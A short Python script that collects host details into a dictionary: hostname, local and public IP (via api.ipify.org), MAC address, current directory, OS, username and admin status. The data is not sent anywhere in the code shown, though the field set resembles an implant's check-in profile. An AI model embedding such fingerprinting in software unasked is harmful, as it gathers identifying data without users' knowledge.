import platform
import requests
import socket
import os
from getmac import get_mac_address
import ctypes
import getpass

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)

def is_admin():
    """
    Checks if the current Python script is running with administrative privileges.
    Returns True if running as admin, False otherwise.
    """
    try:
        # For Unix-like systems (Linux, macOS), check if the effective user ID is 0 (root)
        is_admin_status = (os.getuid() == 0)
    except AttributeError:
        # For Windows systems, use ctypes to call IsUserAnAdmin() from shell32.dll
        is_admin_status = (ctypes.windll.shell32.IsUserAnAdmin() != 0)
    return is_admin_status

connection_details: dict = {
    "hostname": hostname,
    "cwd": os.getcwd(),
    "os_name": platform.system(),
    "local_ip": local_ip,
    "public_ip": requests.get('https://api.ipify.org').text,
    "mac_address": get_mac_address(),
    "is_admin": is_admin(),
    "username": getpass.getuser()
}